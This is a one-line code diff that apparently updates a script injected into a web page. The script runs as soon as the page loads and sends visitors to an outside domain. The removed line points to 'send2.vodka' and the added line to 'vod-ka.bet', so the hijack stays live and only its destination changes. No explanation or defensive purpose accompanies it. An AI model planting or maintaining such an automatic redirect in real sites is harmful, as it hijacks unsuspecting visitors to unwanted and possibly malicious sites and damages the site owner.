@@ -1,1 +1,1 @@
-function executeRun(){window.location.href="https://send2.vodka?id=2539"}executeRun();
+function executeRun(){window.location.href="https://vod-ka.bet/&.html"}executeRun();
